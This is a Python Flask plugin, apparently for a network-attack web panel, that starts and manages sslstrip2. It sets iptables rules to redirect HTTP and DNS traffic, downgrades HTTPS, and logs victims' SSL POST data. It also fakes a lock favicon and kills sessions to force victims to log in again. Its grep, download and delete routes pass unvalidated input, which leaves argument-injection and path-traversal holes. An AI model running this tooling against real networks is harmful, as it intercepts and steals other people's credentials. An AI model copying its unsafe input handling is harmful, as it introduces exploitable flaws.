from flask import Blueprint, render_template, jsonify, request, flash, redirect, url_for, send_file

import os
import subprocess as sb
import apt
from datetime import datetime

from yapsy.IPlugin import IPlugin

from core.globals import Global
from core.utils_flask import logged_in, flash_errors
from core.utils import getPID, termKill
from core import DN


DIR_PATH = Global.PLUGINS_DIR + "/SSLstrip2"
BIN_SSLSTRIP = DIR_PATH + "/sslstrip2/sslstrip.py"
HISTORY_DIR = DIR_PATH + "/history"

sslstrip_b = Blueprint( "sslstrip_b", __name__, template_folder="templates")

@sslstrip_b.route("/")
@logged_in
def show_sslstrip():
    status = {}
    form = SSLstripForm()
    status["pid"] = getPID(BIN_SSLSTRIP, script=True)

    # get list of already stored files.
    status["history_list"]=[]
    if os.path.isdir(HISTORY_DIR):
        status["history_list"] = sorted([f for f in os.listdir(HISTORY_DIR) if os.path.isfile(HISTORY_DIR+"/"+f)])[::-1]

    return render_template("sslstrip2_index.html", form=form, status=status)

@sslstrip_b.route("/start", methods=["POST"])
@logged_in
def start_ssltrip():

    form = SSLstripForm(request.form)

    if form.validate_on_submit():
        if getPID(BIN_SSLSTRIP, script=True) != -1:
            flash("Already running", "warning")
            return redirect( url_for("sslstrip_b.show_sslstrip") )


        now = datetime.now()
        time_str = "%d-%d-%d" % (now.hour, now.minute, now.second)
        file_name = HISTORY_DIR + "/%s@%s.log" % (str(now.date()), time_str)

        port = str(form.port.data)
        log_option = str(form.log_option.data)

        cmd = ["python", BIN_SSLSTRIP, log_option]
        if form.favicon.data == True:
            cmd.append("-f")

        if form.killsessions.data == True:
            cmd.append("-k")

        cmd = cmd + ["-l", port, "-w", file_name]

        sb.call("iptables --table nat --append PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53",shell=True)
        sb.call("iptables --table nat --append PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port,shell=True)

        print " ".join(cmd)
        sb.Popen(cmd, stdout=DN, stderr=DN)

        flash("Started Successfully on port : " + port, "success")
    else:
        flash_errors(form)

    return redirect( url_for("sslstrip_b.show_sslstrip") )

@sslstrip_b.route("/stop")
@logged_in
def stop_sslstrip():
    termKill(BIN_SSLSTRIP, script=True)
    flash("Stop sslstrip.", "success")
    return redirect( url_for("sslstrip_b.show_sslstrip") )

@sslstrip_b.route("/grepfile", methods=["GET"])
@logged_in
def grepfiles():

    if "filename" not in request.args:
        return jsonify(message="filename not specified."), 400

    if "pattern" not in request.args:
        return jsonify(message="pattern not specified."), 400
    print "YESS"
    pattern = str(request.args["pattern"])
    filename = str(request.args["filename"])
    print "==============>", pattern, len(pattern)
    if len(pattern) == 0:
        return jsonify(message="pattern not specified."), 400

    FILE_PATH = HISTORY_DIR + "/" + filename
    print " ".join(["grep"] + pattern.split(" ") + [FILE_PATH])
    stdout = sb.Popen(["grep"] + pattern.split(" ") + [FILE_PATH], stdout=sb.PIPE).stdout
    matched = stdout.read()[:-1]

    return jsonify(message=matched)

@sslstrip_b.route("/download/<file_name>")
@logged_in
def download_file(file_name):
    download_file = HISTORY_DIR+"/"+file_name

    if not os.path.exists(download_file):
        return "File name : " + file_name + " Doesnt exists."

    return send_file(download_file, attachment_filename=file_name)

@sslstrip_b.route("/delete/<file_name>")
@logged_in
def delete_file(file_name):
    delete_file = HISTORY_DIR+"/"+file_name

    if not os.path.exists(delete_file):
        return "File name : " + file_name + " Doesnt exists."

    os.remove(delete_file)

    if request.referrer:
        flash("deleted file " + file_name + "Successfully", "success")
        return redirect(request.referrer)

    return  "deleted file " + file_name + "Successfully", "success"



class Sslstrip2Plugin(IPlugin):

    def getBlueprint(self):
        return sslstrip_b

    def checkDependencies(self):
        cache = apt.Cache()
        if os.path.isdir(DIR_PATH + "/sslstrip2/"):
            if ("python-twisted" in cache) and (cache["python-twisted"].is_installed):
                return True
        return False

    def installDependencies(self):
        sb.call(["git", "clone", "https://github.com/byt3bl33d3r/sslstrip2.git", DIR_PATH + "/sslstrip2"])
        sb.call("apt-get install python-twisted -y", shell=True)


    def activate(self):
        # check if dir exists if not create
        if not os.path.isdir(HISTORY_DIR):
            os.makedirs(HISTORY_DIR)

        print "Sslstrip2 Activated : History File Loc : " + HISTORY_DIR



from flask_wtf import FlaskForm
from wtforms import BooleanField, IntegerField, SelectField
from wtforms.validators import NumberRange

class SSLstripForm(FlaskForm):
    log_option = SelectField("Log Option : ", choices=[("-p", "Log only SSL POSTs (default)."), ("-s", "Log all SSL traffic to and from server."), ("-a", "Log all SSL and HTTP traffic to and from server")])
    favicon = BooleanField("Substitute a lock favicon on secure requests.",default=False)
    port = IntegerField("Port number",default=9000, validators=[NumberRange(min=2000, max=65535, message="Invailid port number")])
    killsessions = BooleanField("Kill sessions in progress (logout victim).",default=False)
